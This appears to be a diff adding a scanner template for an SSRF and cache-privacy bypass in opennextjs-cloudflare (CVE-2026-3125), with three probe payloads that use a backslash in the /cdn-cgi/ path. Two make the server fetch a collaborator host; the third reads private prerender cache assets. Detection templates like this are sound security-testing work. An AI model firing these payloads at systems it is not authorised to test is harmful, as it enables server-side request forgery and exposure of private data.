@@ -37,6 +37,49 @@
           "variables": {}
         }
       ]
+    },
+    "opennext_cloudflare_cdn_cgi_backslash_norm_2026": {
+      "description": "CVE-2026-3125 (opennextjs-cloudflare < 1.17.1) — Cloudflare edge router string-matches /cdn-cgi/ prefix; a request to /cdn-cgi\\image/<url> does NOT match (raw \\ != /) and passes to the Worker. Inside the Worker, WHATWG URL constructor normalises \\ → /, so the path becomes /cdn-cgi/image/<url> and the OpenNext image handler fetches the attacker-supplied URL → SSRF + bypass of private /cdn-cgi/_next_cache asset privacy.",
+      "tech_match": ["cloudflare", "cloudflare-workers", "opennext", "opennextjs", "nextjs"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/cdn-cgi\\image/format=auto/https://COLLABORATOR/",
+          "description": "Raw backslash variant — edge prefix-match fails, worker normalises, fetches Collaborator. Primary positive: outbound DNS + HTTP from Cloudflare egress IP range.",
+          "matchers": [
+            {"type": "collaborator", "condition": "or"},
+            {"type": "header", "headers": ["cf-ray"], "condition": "and"},
+            {"type": "not_status", "status": [403, 404], "condition": "and"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {"COLLAB_REQUIRED": true, "path_override": true}
+        },
+        {
+          "payload": "/cdn-cgi%5Cimage/format=auto/https://COLLABORATOR/",
+          "description": "URL-encoded backslash (%5C) variant — some edge proxies decode before prefix-match, others don't. Run both to capture either-edge behaviour.",
+          "matchers": [
+            {"type": "collaborator", "condition": "or"},
+            {"type": "header", "headers": ["cf-ray"], "condition": "and"},
+            {"type": "not_status", "status": [403, 404], "condition": "and"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65,
+          "variables": {"COLLAB_REQUIRED": true, "path_override": true}
+        },
+        {
+          "payload": "/cdn-cgi\\_next_cache/<private-asset-path>",
+          "description": "Cache-asset privacy bypass variant — same normalisation flaw lets an unauth caller read the Worker's private prerender cache. Differential vs /cdn-cgi/_next_cache baseline reveals the bypass.",
+          "matchers": [
+            {"type": "length_delta", "min_diff": 256},
+            {"type": "status", "status": [200, 206], "condition": "and"},
+            {"type": "not_header", "headers": ["x-nextjs-cache"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {"path_override": true, "needs_baseline": true}
+        }
+      ]
     }
   }
 }
